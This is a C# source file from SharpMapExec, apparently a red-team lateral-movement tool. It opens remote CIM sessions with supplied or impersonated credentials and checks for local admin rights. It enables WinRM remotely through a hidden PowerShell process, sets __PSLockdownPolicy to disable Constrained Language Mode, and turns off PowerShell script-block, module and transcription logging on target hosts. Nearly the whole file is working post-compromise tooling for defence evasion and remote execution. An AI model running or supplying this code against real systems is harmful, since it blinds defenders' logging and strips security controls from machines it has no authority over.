using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Management.Infrastructure;
using Microsoft.Management.Infrastructure.Options;
using SharpMapExec.Helpers;

namespace SharpMapExec.Lib
{
    class Cim
    {
        public static string Namespace = @"root\cimv2";

        public static CimSession newSession(string computername, string domain, string username, string password, bool impersonate = false)
        {
            CimSession cimSession;

            if (impersonate)
            {
                DComSessionOptions options = new DComSessionOptions { Impersonation = ImpersonationType.Default };
                cimSession = CimSession.Create(computername, options);
            }
            else
            {
                CimCredential credentials = new CimCredential(PasswordAuthenticationMechanism.Negotiate, domain, username, Misc.CreateSecuredString(password));
                WSManSessionOptions sessionOptions = new WSManSessionOptions();
                sessionOptions.AddDestinationCredentials(credentials);
                sessionOptions.MaxEnvelopeSize = 256000;
                cimSession = CimSession.Create(computername, sessionOptions);
            }
            return cimSession;
        }

        public static bool CheckLocalAdmin(CimSession cimSession)
        {
            if (!cimSession.TestConnection(out CimInstance instance, out CimException exception))
            {
                Console.WriteLine(String.Format("  [-] Failed to authenticate on {0}", cimSession.ComputerName));
                return false;
            }
            Console.WriteLine(String.Format("  [+] Local Admin on {0}", cimSession.ComputerName));
            return true;
        }

        public static void enable_winrm(CimSession cimSession)
        {
            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
            {
                CimMethodParameter.Create("CommandLine", "powershell -nop -w hidden -command 'Enable-PSRemoting -Force'", CimFlags.In)
            };            
            CimMethodResult results = cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
            if (results.ReturnValue.Value.ToString() == "0")
            {
                Console.WriteLine("  [+] WinRm Enabled");
            }
            else
            {
                Console.WriteLine("  [-] Failed To Enable WinRm");
            }
        }

        public static void disable_winrm(CimSession cimSession)
        {
            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
            {
                CimMethodParameter.Create("CommandLine", "powershell -nop -w hidden -command 'Disable-PSRemoting -Force'", CimFlags.In)
            };
            CimMethodResult results = cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
            if (results.ReturnValue.Value.ToString() == "0")
            {
                Console.WriteLine("  [+] WinRm Disabled");
            }
            else
            {
                Console.WriteLine("  [-] Failed To Disable WinRm");
            }
        }

        //registry
        //https://wutils.com/wmi/root/cimv2/stdregprov/
        public static bool regExists(CimSession cimSession, UInt32 hDefKey, string sSubKeyName, string keyName)
        {
            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
            {
                CimMethodParameter.Create("hDefKey", hDefKey, CimFlags.In),
                CimMethodParameter.Create("sSubKeyName", sSubKeyName, CimFlags.In)
            };
            CimMethodResult results = cimSession.InvokeMethod(new CimInstance("StdRegProv", Namespace), "EnumValues", cimParams);
            if (results.ReturnValue.Value.ToString() != "0")
                return false;

            string value = ((string[])results.OutParameters["sNames"].Value).FirstOrDefault(i => i.Contains(keyName));
            if (string.IsNullOrEmpty(value))
            {
                return false;
            }
            return true;
        }

        public static CimMethodResult readRegValue(CimSession cimSession, UInt32 hDefKey, string sSubKeyName, string keyName, string method)
        {
            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
            {
                CimMethodParameter.Create("hDefKey", hDefKey, CimFlags.In),
                CimMethodParameter.Create("sSubKeyName", sSubKeyName, CimFlags.In),
                CimMethodParameter.Create("sValueName", keyName, CimFlags.In)
            };
            CimMethodResult results = cimSession.InvokeMethod(new CimInstance("StdRegProv", Namespace), method, cimParams);
            return results;
        }

        public static string setRegValue(CimSession cimSession, UInt32 hDefKey, string sSubKeyName, string keyName, string keyValue)
        {
            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
            {
                CimMethodParameter.Create("hDefKey", hDefKey, CimFlags.In),
                CimMethodParameter.Create("sSubKeyName", sSubKeyName, CimFlags.In),
                CimMethodParameter.Create("sValueName", keyName, CimFlags.In),
                CimMethodParameter.Create("sValue", keyValue, CimFlags.In)
            };
            CimMethodResult result = cimSession.InvokeMethod(new CimInstance("StdRegProv", Namespace), "SetStringValue", cimParams);
            return result.ReturnValue.Value.ToString();
        }

        public static string setRegValue(CimSession cimSession, UInt32 hDefKey, string sSubKeyName, string keyName, UInt32 keyValue)
        {
            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
            {
                CimMethodParameter.Create("hDefKey", hDefKey, CimFlags.In),
                CimMethodParameter.Create("sSubKeyName", sSubKeyName, CimFlags.In),
                CimMethodParameter.Create("sValueName", keyName, CimFlags.In),
                CimMethodParameter.Create("uValue", keyValue, CimFlags.In)
            };
            CimMethodResult result = cimSession.InvokeMethod(new CimInstance("StdRegProv", Namespace), "SetDWORDValue", cimParams);
            return result.ReturnValue.Value.ToString();
        }

        public static void disable_pslockdown(CimSession cimSession)
        {
            bool lockdown = regExists(cimSession, 0x80000002, "System\\CurrentControlSet\\Control\\Session Manager\\Environment", "__PSLockdownPolicy");
            if (!lockdown)
            {
                Console.WriteLine("[*] CLM not enabled");
                return;
            }

            string value = (string)readRegValue(cimSession, 0x80000002, "System\\CurrentControlSet\\Control\\Session Manager\\Environment", "__PSLockdownPolicy", "GetStringValue").OutParameters["sValue"].Value;
            Console.WriteLine("  [*] __PSLockdownPolicy value: {0}", value);

            if (value.ToString() == "8")
            {
                return;
            }

            string result = setRegValue(cimSession, 0x80000002, "System\\CurrentControlSet\\Control\\Session Manager\\Environment", "__PSLockdownPolicy", "8");
            if (result.Contains("0"))
            {
                Console.WriteLine("  [+] Constrained Language Mode Disabled");
            }
            else
            {
                Console.WriteLine("  [-] Failed To Disable Constrained Language Mode");
            }
        }

        public static void check_pslockdown(CimSession cimSession)
        {
            bool lockdown = regExists(cimSession, 0x80000002, "System\\CurrentControlSet\\Control\\Session Manager\\Environment", "__PSLockdownPolicy");
            if (!lockdown)
            {
                Console.WriteLine("[*] CLM not enabled");
                return;
            }

            string value = (string)readRegValue(cimSession, 0x80000002, "System\\CurrentControlSet\\Control\\Session Manager\\Environment", "__PSLockdownPolicy", "GetStringValue").OutParameters["sValue"].Value;
            Console.WriteLine("  [*] __PSLockdownPolicy value: {0}", value);
        }

        public static void disable_pslogging(CimSession cimSession)
        {
            Dictionary<string, string> keys = new Dictionary<string, string>
            {
                { "EnableModuleLogging", @"Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" },
                { "EnableTranscripting", @"Software\Policies\Microsoft\Windows\PowerShell\Transcription" },
                { "EnableScriptBlockLogging", @"Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" },
                { "EnableScriptBlockInvocationLogging", @"Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" },
            };
            foreach (var key in keys)
            {
                bool lockdown = regExists(cimSession, 0x80000002, key.Value, key.Key);
                if (!lockdown)
                {
                    Console.WriteLine("[*] {0} not enabled", key.Key);
                    continue;
                }

                var value = readRegValue(cimSession, 0x80000002, key.Value, key.Key, "GetDWORDValue").OutParameters["uValue"].Value;
                Console.WriteLine("  [*] {0} value: {1}", key.Key, value);

                if(value.ToString() == "0")
                {
                    continue;
                }

                string result = setRegValue(cimSession, 0x80000002, key.Value, key.Key, 0);
                if (result.Contains("0"))
                {
                    Console.WriteLine("  [+] {0} Disabled", key.Key);
                }
                else
                {
                    Console.WriteLine("  [-] Failed To Disable {0}", key.Key);
                }
            }
        }

        public static void check_pslogging(CimSession cimSession)
        {
            Dictionary<string, string> keys = new Dictionary<string, string>
            {
                { "EnableModuleLogging", @"Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" },
                { "EnableTranscripting", @"Software\Policies\Microsoft\Windows\PowerShell\Transcription" },
                { "EnableScriptBlockLogging", @"Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" },
                { "EnableScriptBlockInvocationLogging", @"Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" },
            };
            foreach (var key in keys)
            {
                if (!regExists(cimSession, 0x80000002, key.Value, key.Key))
                {
                    Console.WriteLine("[*] {0} not enabled", key.Key);
                    continue;
                }
                var value = readRegValue(cimSession, 0x80000002, key.Value, key.Key, "GetDWORDValue").OutParameters["uValue"].Value;
                Console.WriteLine("  [*] {0} value: {1}", key.Key, value);
            }
        }
    }
}
